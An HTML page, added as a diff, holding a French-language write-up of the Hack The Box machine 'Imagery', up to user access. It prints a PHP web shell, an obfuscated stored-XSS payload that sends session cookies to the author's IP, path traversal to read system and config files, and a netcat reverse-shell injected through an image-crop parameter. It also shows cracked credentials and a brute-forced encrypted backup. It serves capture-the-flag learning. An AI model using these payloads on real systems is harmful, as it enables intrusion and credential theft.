@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Imagery - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Imagery">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto">Imagery</h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="2b5aa764-c45c-8083-a1f2-fb1ba71fbedc" class="">User</h1></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-806a-bbef-eaae03618cd6" class="column-list"><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-80ca-9111-da1c9225b361" style="width:50%" class="column"><div style="display:contents" dir="ltr"><figure id="2b3aa764-c45c-8016-9eb4-df8df6b4783e"><a href="https://portswigger.net/web-security/file-upload" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">File uploads | Web Security Academy</div><div class="bookmark-description">In this section, you&#x27;ll learn how simple file upload functions can be used as a powerful vector for a number of high-severity attacks. We&#x27;ll show you how to ...</div></div><div class="bookmark-href">https://portswigger.net/web-security/file-upload</div></div></a></figure></div></div></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-80ed-948a-c4671ec6bfb2" style="width:50%" class="column"><div style="display:contents" dir="ltr"><figure id="2b4aa764-c45c-804b-b2d2-f3ef680345d6"><a href="https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">File Upload Vulnerabilities and Security Best Practices</div><div class="bookmark-description">In this article, we review file upload vulnerabilities. We also detail the exploitations and security best practices for protecting against them.</div></div><div class="bookmark-href">https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/</div></div></a></figure></div></div></div></div></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8041-90ab-c7e805e6d223" class="">je commence par mettre un payload php mais avec un magic byte gif (le seul magic byte de la liste qui soit imprimable)</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8058-977a-f7c18f084bc6" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">GIF89a;
+&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80c3-9a7a-d4af68de78bb" class="">le fichier je le met en .gif le probleme c’est que c’est vraiement interprété comme un gif</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8051-ae04-cef781e5d85e" class="">après avoir testé plusieurs file upload je me remet en question enfin</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8060-8f4c-eddfbc21d8b0" class="">je recommence le discovery : </p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-803f-b471-f2e902150dbb" class="">dans les js on a tous les endpoints api donc je tes test un par un</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8071-9ee2-cc5f4f68a2b8" class="">/auth_status renvoie :</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8004-81d1-f9a262d27ae3" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+&quot;displayId&quot;:&quot;9c41fd2e&quot;,
+&quot;isAdmin&quot;:false,
+&quot;isTestuser&quot;:false,
+&quot;loggedIn&quot;:true,
+&quot;username&quot;:&quot;rrr@rrr.rrr&quot;
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8016-bafe-c8ab76a3f3ff" class="">/images renvoie</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-809a-aae5-d02c3b479a63" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{&quot;grouped_images&quot;:[{&quot;images&quot;:[{&quot;actual_mimetype&quot;:&quot;image/jpeg&quot;,&quot;description&quot;:&quot;&quot;,&quot;filename&quot;:&quot;44922a3e-7dbd-49a1-ae8e-1ecc92ab4e90_journal.jpg&quot;,&quot;group&quot;:&quot;My Images&quot;,&quot;id&quot;:&quot;b31cbade-56b7-4ba2-abee-57a561c6b2a8&quot;,&quot;timestamp&quot;:&quot;2025-11-23T13:29:34.358120&quot;,&quot;title&quot;:&quot;journal&quot;,&quot;type&quot;:&quot;original&quot;,&quot;uploadedBy&quot;:&quot;rrr@rrr.rrr&quot;,&quot;uploadedByDisplayId&quot;:&quot;9c41fd2e&quot;,&quot;url&quot;:&quot;/uploads/44922a3e-7dbd-49a1-ae8e-1ecc92ab4e90_journal.jpg&quot;}],&quot;name&quot;:&quot;My Images&quot;}],&quot;images&quot;:[{&quot;actual_mimetype&quot;:&quot;image/jpeg&quot;,&quot;description&quot;:&quot;&quot;,&quot;filename&quot;:&quot;44922a3e-7dbd-49a1-ae8e-1ecc92ab4e90_journal.jpg&quot;,&quot;group&quot;:&quot;My Images&quot;,&quot;id&quot;:&quot;b31cbade-56b7-4ba2-abee-57a561c6b2a8&quot;,&quot;timestamp&quot;:&quot;2025-11-23T13:29:34.358120&quot;,&quot;title&quot;:&quot;journal&quot;,&quot;type&quot;:&quot;original&quot;,&quot;uploadedBy&quot;:&quot;rrr@rrr.rrr&quot;,&quot;uploadedByDisplayId&quot;:&quot;9c41fd2e&quot;,&quot;url&quot;:&quot;/uploads/44922a3e-7dbd-49a1-ae8e-1ecc92ab4e90_journal.jpg&quot;}],&quot;success&quot;:true}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8060-9d1c-cd9e1c9778f2" class="">/admin/users (ainsi que tous les endpoints fils) renvoie</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80bd-8974-c78f41077c94" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{&quot;message&quot;:&quot;Access denied. Administrator privileges required.&quot;,&quot;success&quot;:false}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8060-a08a-e2a63eae272e" class="">tout le reste a été reffusé (mais pas 404 donc ils existent)</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8097-bf1f-eadb8b97953e" class="">/get_image_collections</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80bd-afdb-e9c09bb4fea8" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{&quot;collections&quot;:[{&quot;name&quot;:&quot;My Images&quot;},{&quot;name&quot;:&quot;Unsorted&quot;},{&quot;name&quot;:&quot;Converted&quot;},{&quot;name&quot;:&quot;Transformed&quot;}],&quot;success&quot;:true}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8071-a8b6-fe6bc6a04de3" class="">liste complete des api leak dans les js du site</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8005-95f1-e566f30bc6ba" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">/auth_status
+/register
+/login
+/logout
+/images
+/delete_image
+/edit_image_details
+/convert_image
+/apply_visual_transform
+/delete_image_metadata
+/upload_image
+/admin/users
+/admin/bug_reports
+/admin/delete_user
+/admin/delete_bug_report
+/admin/get_system_log</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80cd-999a-d0bb79589af8" class="">Fuzzing des répertoires complet pour voir si j’ai manqué qqch</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-800a-b172-d3c90368730a" class="">ca donne rien</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80e4-80a7-d76d086e0d32" class="">par contre Il y a un endpoint report_bug donc je cherche sur la page et Il y a une page de bug report que je n’avais jamais vu</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8088-9d50-ec59161ab6a9" class="">Test avec la xss de base et si je ne recois pas de reponses je l’obfusque</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80d0-a94c-c50a55bb43e9" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;img src=1 onerror=&quot;document.location = &#x27;http://10.10.15.157:6677/?content=&#x27; + encodeURIComponent(document.cookie)&quot;&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80fb-a5bb-fb30c4f1224d" class="">pas de reponses j’obfusque</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8053-b9f4-f6db72383292" class="">document.location = &#x27;<a href="http://10.10.15.157:6677/?content=">http://10.10.15.157:6677/?content=</a>&#x27; + encodeURIComponent(document.cookie)</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8092-953d-d9abe58f7183" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&lt;button autofocus onfocus=[]filter.constructor(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovLzEwLjEwLjE1LjE1Nzo2Njc3Lz9jb250ZW50PScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ==&#x27;))()&gt;clique&lt;/button&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8090-81ef-ebe4eeae5064" class=""><a href="https://www.notion.so/XSS-Stored-contournement-de-filtres-287aa764c45c80d99d24ef2f840794f6?pvs=21">XSS - Stored - contournement de filtres</a> <br/>🥹</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-805d-9223-e90864fb0c67" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">[+] new content from 10.10.11.88: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSMoCQ.33bHsXtUO9J3tl6sVctTQTkOzP0</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8062-bd73-c2fca822eb8e" class="">maintenant je peux avoix acces a la liste des users</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-802d-baae-f440b4757abb" class="">ah bon j’avais pas vu mais sur la page d’accueille quand on est admin Il y a un bouton admin panel donc j’y vais et Il y a des logs</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8080-9da1-f5df7ff94138" class="">appres les avoir lu j’ai presque rien appris si ce n’est que dans le js la fonction qui gere l’affichage des logs ressemble a ca :</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-807a-8673-c728c770c250" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">function handleDownloadUserLog(username) {
+    const logIdentifier = username;
+    const logType = &#x27;user&#x27;;
+    window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;
+}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80ce-bb9f-fb8a99f2451a" class="">on voit que log_identifier=….log correspond a un fichier local</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-801d-ac8a-ec10b362916e" class="">Tentative de une lfi :</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8015-b87f-d9767cf0e140" class="">quand je met test ça renvoie une erreur :</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-808c-8ba5-ff14dc217860" class="">&quot;Error reading file: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.”</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80d5-9dc2-c65ce026c214" class="">donc ca confirme que c’est bien un file</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80d1-9835-e4a2e0326e0b" class="">Test avec des ../etc/passwd en rajoutant des ../ ca met la meme erreur jusqu’a que j’y arrive avec ../../../../../etc/passwd </p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-808d-868f-edce953eb0b8" class="">Il y a que 3 user qui ont un bash</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80a6-9463-fc0ed66aacab" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">root:x:0:0:root:/root:/bin/bash
+web:x:1001:1001::/home/web:/bin/bash
+mark:x:1002:1002::/home/mark:/bin/bash</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-805a-85e2-eec36e7ae0df" class="">Fuzzing des répertoires avec des<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder"> wordlists de path traversal</a></p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80eb-9a73-c0d9877e1529" class="">rien ne marche</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8071-be49-e9ac8eb290c6" class="">on sait que web a un home directory donc ../../../../../home/web/ existe</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8098-a879-eeefc14363b4" class="">je sais pas quoi chercher</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80cb-b663-f827a3a5e8e3" class="">je suis con je cherchais dans /home/web mais ca c’est le user c’est pas le dossier de l’app</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8098-a54f-c0696b13d188" class="">donc evidemment que mon /home/web/config.py ne renvoie rien, je dois chercher dans </p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80d8-bd0c-e74e5407d707" class="">home/web/web et donc maintenant ca correspond au bon nombre de “../”</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80cd-be65-fd3654d90877" class="">bingo</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80ca-8fa5-fb57ae0060e6" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">DATA_STORE_PATH = &#x27;db.json&#x27;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-802e-8ef5-fe3e3052b86f" class="">dans le meme repertoire</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-804f-9d7e-e63d22e7c821" class="">donc Téléchargement et j’ai :</p></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-80c3-9a61-d3546b6be4af" class="column-list"><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-8058-a02a-f1f2706fd58e" style="width:50%" class="column"><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8041-adeb-fe8b844f1540" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">&quot;username&quot;: &quot;admin@imagery.htb&quot;,
+&quot;password&quot;: &quot;5d9c1d507a3f76af1e5c97a3ad1eaa31&quot;</code></pre></div></div></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-8021-801b-d6083e1c8047" style="width:50%" class="column"><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-8029-81a1-cdc795654a5f" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">&quot;username&quot;: &quot;testuser@imagery.htb&quot;,
+&quot;password&quot;: &quot;2c65c8d7bfbca32a3ed42596192384f6&quot;</code></pre></div></div></div></div></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-802b-b9cb-da5091b48107" class="column-list"><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-80ad-a93a-c6563488ccee" style="width:50%" class="column"><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8025-b294-eb8957de426f" class="">*7¡Vamos!</p></div></div></div><div style="display:contents" dir="auto"><div id="2b4aa764-c45c-808b-a922-da87a4c256f7" style="width:50%" class="column"><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-807b-b598-e5421c29fdc3" class="">iambatman</p></div></div></div></div></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80e3-bfec-d40faedce0ef" class="">j’essaye de me ssh a mark :</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-801b-9c6a-fef2254bf8c3" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents $ ssh mark@imagery.htb
+The authenticity of host &#x27;imagery.htb (10.10.11.88)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is: SHA256:1f09NrF6QWI5nbZzSJJflV8ACTiH/pMDmhIFayf3VD4
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;imagery.htb&#x27; (ED25519) to the list of known hosts.
+mark@imagery.htb: Permission denied (publickey).</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-804e-9301-d2a7e3fd03c9" class="">j&#x27;ai encore ma lfi je dois en profiter pour cat le fichier de clés ssh</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8049-b317-e15f87a5c7a0" class="">me connecter avec ces creds sur le site</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8031-a610-dbba076cce73" class="">le site pour test user est le meme partout sauf qu’il a acces aux features qui sont encore en prod comme CONVERT FORMAT</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8012-a7dc-f9eb0d9d1fa6" class="">je cree un png a avec un shell dedans puis je change le format sur burp</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-802d-a6e2-cc817a15d52b" class="">mon shell.gif : &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]); ?&gt;</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80c2-a849-eaa90a270b0a" class="">je modifie la requete de conversion en jpg pour faire mettre php</p></div><div style="display:contents" dir="auto"><pre id="2b4aa764-c45c-80c0-8498-c0165b03b519" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">{&quot;imageId&quot;:&quot;26a84cbb-e877-4a74-be18-d861e7b6bd86&quot;,&quot;targetFormat&quot;:&quot;php&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80dd-a137-d00d89f297da" class="">ça marche pas c’est interdit mdrr</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-80a0-aa1c-e16151fc5c63" class="">ON A LE CODE SOURCE DE L’APP</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-807b-971e-e3b028c4bae7" class="">non aucun résultat exploitable je reviens dans ma lfi pour justement trouver l’app.py</p></div><div style="display:contents" dir="auto"><p id="2b4aa764-c45c-8049-b1ab-f9bc4b9f7676" class="">je trouve le <a href="http://app.py">app.py</a> qui fait reference au <a href="http://config.py">config.py</a> et au <a href="http://utils.py">utils.py</a> que je m’empresse de trouver</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80f1-b47f-f4f09ba963bd" class="">il donne tous les api_….py</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80c7-ad00-c14ecf81312c" class="">je m’interesse au api_edit (le seul truc qui nous diférencie des users normaux) et je vois s’Il y a des injections/</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-8015-9703-cb02c58a4b59" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">command = f&quot;{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}&quot;
+subprocess.run(command, capture_output=True, text=True, shell=True, check=True)</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-803d-a585-f9b86d1d447f" class="">dans crop on peut mettre une entrée utilisateur ET on a acces a un shell</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-801b-a4a2-ede278c20d56" class="">donc dans le width ou le height on peut injecter une commande comme ceci</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-800e-8c7a-fd06a6389d36" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">; id</code></pre></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-808c-9f30-df67a018e4d3" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">/?content=session%3D.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSQXVA.cjqou044OnsancHwhrrHaDCI7GQ</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d8-ac27-fea2be90fba8" class="">ca c’est ma requete mais mon nc recois la connexion mais ne la garde pas</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-8066-86de-ff751484b1e0" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{&quot;imageId&quot;:&quot;07156bc3-61f2-42ef-8e7f-268133e0e990&quot;,&quot;transformType&quot;:&quot;crop&quot;,&quot;params&quot;:{&quot;x&quot;:0,&quot;y&quot;:0,&quot;width&quot;:500,&quot;height&quot;:&quot;390; busybox nc 10.10.15.157 6677 -e /bin/bash&quot;}}</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80cf-beb5-dcbd7236b2c8" class="">je rajoute ; echo (tant que le echo n’est pas exécuté, le processus parent survit donc continue d’executer le revshell, ca aurait pu marcher avec cat etc)</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8029-a62f-dde9b83ce021" class="">j’ai un shell</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8034-a036-d5f309dd20c8" class="">mon objectif maintenant c’est d’avoir les clés pour me ssh a mark</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-801e-b0f7-f3dad4ad242f" class="">bon c’est du je grep dans mon rendu linpeas rsa et je trouve ca  </p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-8064-9b9d-cd843f6143a3" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">web@Imagery:~$ cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDebNY/k0wVOIPwMiMIACCozB86D6HmS4aJ8cnxqcUw136cd1jOIckN7CvNJ3dc2Wnklh8lvDPNQ+/h2NSIEc85q92LmFyS/bZRq0U2EPxKbkjpOy5P9sTUdnao94j/ayq28wgS9GOgjSaxiBT7fqsktkCUEbeCdPxIQPUJMOyoCj9Zse2+4iJa1Lr6LIrF6U9bwgsmdiTDORDx7TRP9JdhXj8XhQMGooatNmi7YnpSCXJh7pU0RlODy7ENO3GVO8QpKGZIu8t/90R/EpjThMzWLcUA4m40QG1/g2D71qwnolkT45ese6aIc2x38EZ9AEHLDcXhwmhHU5svWv4PvC92Z0Y5zRJeKj3Y6PAFM9II+PDJlf7N9xNIN06JGpZ9gTo+oO39uORiNRu+6uyD18R5aEzXafaxm33fjzhNKAAWSVOedbzTR96jdziExJxtwBSHDwgwfS5wLzrei9NjMvhnpxAUfObZt4rJNc4s0+H/AWss5AnI+ykKx47+dG1jLmU= root@osboxes</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d2-815b-c2ff9ac2442d" class="">ca m’aide pas dutout</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80d3-b284-e4db7514e4a0" class="">je continue d’explorer ~/web et dans ~/web/bot/admin.py  ila Il y a ses creds (qu’on avait pas pu dechiffrer tout a l’heure)</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-80d4-ac1b-ffbe868711bc" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ----- Config -----
+CHROME_BINARY = &quot;/usr/bin/google-chrome&quot;
+USERNAME = &quot;admin@imagery.htb&quot;
+PASSWORD = &quot;strongsandofbeach&quot;
+BYPASS_TOKEN = &quot;K7Zg9vB$24NmW!q8xR0p%tL!&quot;
+APP_URL = &quot;http://0.0.0.0:8000&quot;
+# ------------------</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8002-9c7d-ed2cf9068ba4" class="">ca m’avance a rien mais c’est ca mdr</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80e5-bd76-eb1bb8bb9bef" class="">je continue de lire mon linpeas</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-8037-a8fb-cb00f7c8c5fc" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">╔══════════╣ Executable files potentially added by user (limit 70)
+2025-09-22+13:21:44.2709266820 /usr/local/sbin/laurel
+2025-09-22+10:55:05.1975575260 /home/web/.local/bin/wsdump
+2025-08-02+19:56:15.1022096770 /home/web/web/bot/admin.py
+2025-07-30+11:25:49.2198698390 /usr/local/bin/pyAesCrypt
+2025-07-14+17:45:21.8640184880 /var/snap/cups/common/etc/papersize
+2025-07-14+17:18:56.7755866310 /home/web/web/env/bin/flask
+2025-07-14+17:18:56.3315861790 /home/web/web/env/bin/markdown-it
+2025-07-14+17:18:55.6395854630 /home/web/web/env/bin/pygmentize
+2025-07-14+17:18:06.5755041490 /home/web/web/env/bin/pip3.12
+2025-07-14+17:18:06.5755041490 /home/web/web/env/bin/pip3
+2025-07-14+17:18:06.5755041490 /home/web/web/env/bin/pip
+2024-10-27+03:57:08.0284831320 /etc/cloud/clean.d/99-installer
+2024-10-27+03:42:57.0240580590 /etc/console-setup/cached_setup_terminal.sh
+2024-10-27+03:42:57.0170545520 /etc/console-setup/cached_setup_font.sh
+2024-10-27+03:42:57.0130525480 /etc/console-setup/cached_setup_keyboard.sh</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80dc-9dad-c17bb8b33b50" class="">le user a utilisé pyAesCrypt</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80e7-ae55-ed7ae2d7a4bb" class="">Recherche d'informations sur pyaes c’est une lib python qui sert a chiffrer des fichiers</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8084-a012-c379bcda07e3" class="">je grep aes dans le rendu linpeas et hehe</p></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-8010-bcdb-f01665b44a51" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">1786 -rw-rw-r-- 1 root root 23054471 Aug  6  2024 /var/backup/web_20250806_120723.zip.aes</code></pre></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-80ad-8e6a-fc9534585856" class="">j’exfiltre cette backup</p></div><div style="display:contents" dir="auto"><p id="2b5aa764-c45c-8015-b73d-dee957e0e306" class="">je trouve un tool qui dechiffre</p></div><div style="display:contents" dir="ltr"><figure id="2b5aa764-c45c-8018-a627-d3ba83fdb6ac"><div class="source">https://github.com/Nabeelcn25/dpyAesCrypt.py</div></figure></div><div style="display:contents" dir="auto"><pre id="2b5aa764-c45c-80a8-8634-eac561987981" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents/test_serv $ python3 dpyAesCrypt.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt
+
+[🔐] dpyAesCrypt.py – pyAesCrypt Brute Forcer
+
+[🔎] Starting brute-force with 10 threads...
+[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.00% | ETA: 00:00:00 | Tried 0/14344391/home/ygp4ph/Documents/test_serv/dpyAesCrypt.py:42: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
+  pyAesCrypt.decryptStream(fIn, fOut, password.strip(), buffer_size, os.path.getsize(encrypted_file))
+[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.01% | ETA: 00:35:27 | Tried 1050/14344391
+
+[✅] Password found: bestfriends
+🔓 Decrypt the file now? (y/n): y
+/home/ygp4ph/Documents/test_serv/dpyAesCrypt.py:142: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
+  pyAesCrypt.decryptStream(fIn, fOut, cracked_pw, args.buffer, os.path.getsize(args.file))
